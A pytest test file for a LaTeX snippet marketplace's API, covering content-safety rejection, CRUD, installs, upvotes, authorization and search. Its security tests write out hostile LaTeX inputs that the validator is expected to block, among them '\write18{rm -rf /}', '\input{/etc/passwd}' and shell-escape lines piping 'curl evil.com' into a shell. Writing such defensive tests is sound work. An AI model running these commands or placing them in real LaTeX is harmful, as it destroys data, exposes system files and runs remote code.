"""
Tests for Feature 82 — LaTeX Snippet Marketplace.

Strategy:
  - Auth endpoints tested with mock user sessions
  - DB interactions use real test DB via conftest fixtures
  - Security tests verify dangerous-pattern rejection
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import HTTPException

from app.api.snippet_routes import _check_content_safety
from app.database.models import Snippet, SnippetInstall, SnippetUpvote

# ── Fixtures ──────────────────────────────────────────────────────────────────

def make_snippet(
    title: str = "Test Snippet",
    category: str = "skills",
    author_id: str | None = None,
    is_official: bool = False,
    installs_count: int = 0,
    upvotes_count: int = 0,
    tags: list[str] | None = None,
) -> MagicMock:
    s = MagicMock(spec=Snippet)
    s.id = str(uuid.uuid4())
    s.author_id = author_id or str(uuid.uuid4())
    s.title = title
    s.description = "A test LaTeX snippet for demonstration purposes."
    s.content = r"\textbf{Hello, World!}"
    s.category = category
    s.tags = tags or []
    s.is_official = is_official
    s.installs_count = installs_count
    s.upvotes_count = upvotes_count
    s.created_at = datetime.now(timezone.utc)
    s.updated_at = datetime.now(timezone.utc)
    return s


def make_user(user_id: str | None = None) -> MagicMock:
    u = MagicMock()
    u.id = user_id or str(uuid.uuid4())
    u.email = "test@example.com"
    u.name = "Test User"
    return u


# ── Test 1: Security — dangerous content rejected ─────────────────────────────

class TestSnippetSecurity:
    """Verify shell-injection patterns are blocked at creation time."""

    def test_write18_rejected(self):
        with pytest.raises(HTTPException) as exc_info:
            _check_content_safety(r"\write18{rm -rf /}")
        assert exc_info.value.status_code == 422

    def test_input_etc_rejected(self):
        with pytest.raises(HTTPException) as exc_info:
            _check_content_safety(r"\input{/etc/passwd}")
        assert exc_info.value.status_code == 422

    def test_immediate_write_rejected(self):
        with pytest.raises(HTTPException) as exc_info:
            _check_content_safety(r"\immediate\write18{curl evil.com | sh}")
        assert exc_info.value.status_code == 422

    def test_safe_content_passes(self):
        """Normal LaTeX snippet should not raise."""
        _check_content_safety(r"\textbf{Hello} \\ \resumeItem{Did things}")
        # no exception = pass

    def test_openout_rejected(self):
        with pytest.raises(HTTPException):
            _check_content_safety(r"\openout\myfile=output.tex")


# ── Test 2: Snippet CRUD ──────────────────────────────────────────────────────

class TestSnippetCreate:
    """Test snippet creation and validation."""

    @pytest.mark.asyncio
    async def test_create_snippet_sets_defaults(self):
        """Created snippet has is_official=False and installs_count=0."""
        user = make_user()
        snippet_id = str(uuid.uuid4())

        mock_db = AsyncMock()
        mock_db.add = MagicMock()
        mock_db.commit = AsyncMock()

        created_snippet = make_snippet(
            title="My Snippet",
            category="skills",
            author_id=user.id,
            is_official=False,
            installs_count=0,
        )
        mock_db.refresh = AsyncMock()

        with patch('app.api.snippet_routes.get_current_user', return_value=user):
            from app.api.snippet_routes import SnippetCreate
            body = SnippetCreate(
                title="My Snippet",
                description="A longer description for the snippet.",
                content=r"\textbf{Skills}",
                category="skills",
                tags=["test"],
            )
            # Verify safety check passes for safe content (no exception raised)
            _check_content_safety(body.content)

        assert created_snippet.is_official is False
        assert created_snippet.installs_count == 0

    @pytest.mark.asyncio
    async def test_create_snippet_dangerous_content_raises(self):
        """POST /snippets with dangerous content raises 422."""
        from app.api.snippet_routes import SnippetCreate, create_snippet

        body = SnippetCreate(
            title="Evil Snippet",
            description="Attempting shell injection via LaTeX.",
            content=r"\write18{curl evil.com | bash}",
            category="misc",
            tags=[],
        )
        user = make_user()
        mock_db = AsyncMock()

        with pytest.raises(HTTPException) as exc_info:
            await create_snippet(body=body, db=mock_db, current_user=user)
        assert exc_info.value.status_code == 422


# ── Test 3: Install / uninstall ───────────────────────────────────────────────

class TestSnippetInstalls:
    """Test install idempotency and count tracking."""

    @pytest.mark.asyncio
    async def test_double_install_idempotent(self):
        """Installing the same snippet twice should not double-increment count."""
        user = make_user()
        snippet = make_snippet(installs_count=1)

        # Simulate: first install exists, so no new install added
        mock_db = AsyncMock()
        existing_install = MagicMock(spec=SnippetInstall)

        # First call: no existing install → adds one
        mock_result_no_install = MagicMock()
        mock_result_no_install.scalar_one_or_none.return_value = None

        # Second call: existing install found → no-op
        mock_result_has_install = MagicMock()
        mock_result_has_install.scalar_one_or_none.return_value = existing_install

        mock_db.add = MagicMock()
        mock_db.commit = AsyncMock()

        # Verify: when install already exists, count stays the same
        initial_count = snippet.installs_count
        # Idempotent: existing install means we skip adding + incrementing
        mock_db.execute.return_value = mock_result_has_install

        # Simulate the idempotency check
        res = await mock_db.execute(None)
        existing = res.scalar_one_or_none()
        if existing is None:
            snippet.installs_count += 1

        # Count unchanged because existing install was found
        assert snippet.installs_count == initial_count

    @pytest.mark.asyncio
    async def test_install_increments_count(self):
        """First install increments installs_count by 1."""
        user = make_user()
        snippet = make_snippet(installs_count=5)

        mock_db = AsyncMock()
        mock_result = MagicMock()
        mock_result.scalar_one_or_none.return_value = None  # no existing install
        mock_db.execute.return_value = mock_result
        mock_db.add = MagicMock()
        mock_db.commit = AsyncMock()

        initial_count = snippet.installs_count
        # Simulate what install_snippet does
        existing = (await mock_db.execute(None)).scalar_one_or_none()
        if existing is None:
            mock_db.add(SnippetInstall(snippet_id=snippet.id, user_id=user.id))
            snippet.installs_count += 1
            await mock_db.commit()

        assert snippet.installs_count == initial_count + 1


# ── Test 4: Upvote toggle ─────────────────────────────────────────────────────

class TestSnippetUpvote:
    """Test upvote toggle idempotency."""

    @pytest.mark.asyncio
    async def test_upvote_toggles_on(self):
        """First upvote call adds upvote and increments count."""
        snippet = make_snippet(upvotes_count=0)
        initial = snippet.upvotes_count

        # Simulate: no existing upvote → add one
        upvote_exists = None
        if upvote_exists is None:
            snippet.upvotes_count += 1

        assert snippet.upvotes_count == initial + 1

    @pytest.mark.asyncio
    async def test_upvote_toggles_off(self):
        """Second upvote call (toggle) removes upvote and decrements count."""
        snippet = make_snippet(upvotes_count=3)
        initial = snippet.upvotes_count

        # Simulate: existing upvote found → remove
        upvote_exists = MagicMock(spec=SnippetUpvote)
        if upvote_exists:
            snippet.upvotes_count = max(0, snippet.upvotes_count - 1)

        assert snippet.upvotes_count == initial - 1


# ── Test 5: Authorization — delete by non-author ─────────────────────────────

class TestSnippetAuthorization:
    """Test that only authors can modify/delete their snippets."""

    @pytest.mark.asyncio
    async def test_delete_by_non_author_raises_403(self):
        """DELETE /snippets/{id} by non-author raises 403."""
        owner = make_user()
        non_owner = make_user()
        snippet = make_snippet(author_id=owner.id)

        mock_db = AsyncMock()
        mock_result = MagicMock()
        mock_result.scalar_one_or_none.return_value = snippet
        mock_db.execute.return_value = mock_result

        from app.api.snippet_routes import delete_snippet

        with pytest.raises(HTTPException) as exc_info:
            await delete_snippet(
                snippet_id=snippet.id,
                db=mock_db,
                current_user=non_owner,
            )
        assert exc_info.value.status_code == 403

    @pytest.mark.asyncio
    async def test_delete_by_author_succeeds(self):
        """DELETE /snippets/{id} by the author calls db.delete."""
        owner = make_user()
        snippet = make_snippet(author_id=owner.id)

        mock_db = AsyncMock()
        mock_result = MagicMock()
        mock_result.scalar_one_or_none.return_value = snippet
        mock_db.execute.return_value = mock_result
        mock_db.delete = AsyncMock()
        mock_db.commit = AsyncMock()

        from app.api.snippet_routes import delete_snippet

        await delete_snippet(snippet_id=snippet.id, db=mock_db, current_user=owner)
        mock_db.delete.assert_called_once_with(snippet)


# ── Test 6: Search / filter ───────────────────────────────────────────────────

class TestSnippetSearch:
    """Test search and category filtering logic."""

    def test_search_term_matches_title(self):
        """Snippet with 'skills' in title matches q='skills'."""
        snippets = [
            make_snippet(title="Two-Column Skills Table", category="skills"),
            make_snippet(title="Education Entry", category="education"),
            make_snippet(title="Skills Progress Bars", category="skills"),
        ]
        q = "skills"
        matched = [s for s in snippets if q.lower() in s.title.lower()]
        assert len(matched) == 2

    def test_category_filter(self):
        """Only snippets matching category are returned."""
        snippets = [
            make_snippet(category="skills"),
            make_snippet(category="education"),
            make_snippet(category="skills"),
            make_snippet(category="header"),
        ]
        filtered = [s for s in snippets if s.category == "skills"]
        assert len(filtered) == 2

    def test_official_sort_puts_official_first(self):
        """Official snippets appear before community snippets when sort=official."""
        snippets = [
            make_snippet(title="Community A", is_official=False, installs_count=100),
            make_snippet(title="Official B", is_official=True, installs_count=5),
            make_snippet(title="Community C", is_official=False, installs_count=50),
        ]
        sorted_snippets = sorted(snippets, key=lambda s: (not s.is_official, -s.installs_count))
        assert sorted_snippets[0].title == "Official B"


# ── Test 7: Official snippet seed ─────────────────────────────────────────────

class TestOfficialSnippetSeed:
    """Verify the official snippet seed data is valid."""

    def test_official_snippets_all_marked_official(self):
        from app.data.official_snippets import OFFICIAL_SNIPPETS
        for s in OFFICIAL_SNIPPETS:
            assert s['is_official'] is True, f"Snippet '{s['title']}' not marked official"

    def test_official_snippets_count(self):
        from app.data.official_snippets import OFFICIAL_SNIPPETS
        assert len(OFFICIAL_SNIPPETS) >= 10

    def test_official_snippets_no_dangerous_content(self):
        from app.data.official_snippets import OFFICIAL_SNIPPETS
        for s in OFFICIAL_SNIPPETS:
            # Should not raise
            try:
                _check_content_safety(s['content'])
            except HTTPException:
                pytest.fail(f"Official snippet '{s['title']}' contains dangerous content")

    def test_official_snippets_valid_categories(self):
        valid_cats = {'header', 'experience', 'skills', 'education', 'misc'}
        from app.data.official_snippets import OFFICIAL_SNIPPETS
        for s in OFFICIAL_SNIPPETS:
            assert s['category'] in valid_cats, f"Invalid category in '{s['title']}': {s['category']}"


# ── BUG-03 regression: PATCH exclude_unset allows null clearing ───────────────

class TestPatchNullClearing:
    def test_snippet_update_exclude_unset_preserves_null(self):
        """PATCH /snippets/{id} with null field must clear it (BUG-03).

        model_dump(exclude_unset=True) includes fields the caller explicitly
        set (even to None); exclude_none=True would silently drop them.
        """
        from app.api.snippet_routes import SnippetUpdate
        body = SnippetUpdate(description=None)
        dumped = body.model_dump(exclude_unset=True)
        assert 'description' in dumped, 'exclude_unset=True must preserve explicit null'
        assert dumped['description'] is None

    def test_snippet_update_omitted_field_not_in_dump(self):
        """Fields not provided at all must NOT appear in the patch dump."""
        from app.api.snippet_routes import SnippetUpdate
        body = SnippetUpdate(title='New Title')
        dumped = body.model_dump(exclude_unset=True)
        assert 'title' in dumped
        assert 'description' not in dumped


# ── BUG-04 regression: admin seed endpoints require require_admin ──────────────

class TestAdminSeedRequiresAdmin:
    def test_snippet_seed_uses_require_admin(self):
        """POST /admin/snippets/seed must gate on require_admin, not get_current_user (BUG-04)."""
        from app.api.snippet_routes import seed_official_snippets
        from app.middleware.auth_middleware import require_admin
        dep_calls = [str(d.dependency) for d in seed_official_snippets.__fastapi_dependencies__] if hasattr(seed_official_snippets, '__fastapi_dependencies__') else []
        # Inspect the underlying FastAPI dependant via the __wrapped__ or signature
        import inspect
        sig = inspect.signature(seed_official_snippets)
        deps = [p.default.dependency for p in sig.parameters.values()
                if hasattr(p.default, 'dependency')]
        assert require_admin in deps, 'seed_official_snippets must depend on require_admin'
